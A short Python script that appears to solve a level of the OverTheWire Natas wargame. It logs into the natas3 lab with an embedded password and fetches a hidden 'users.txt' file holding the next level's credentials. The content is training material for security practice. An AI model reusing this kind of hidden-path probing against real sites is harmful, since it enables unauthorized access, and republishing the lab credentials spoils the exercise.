import requests
exploit=requests.session()
exploit.auth=('natas3','sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14')
request=exploit.get('http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt')
#password has been in the source
print(request.text)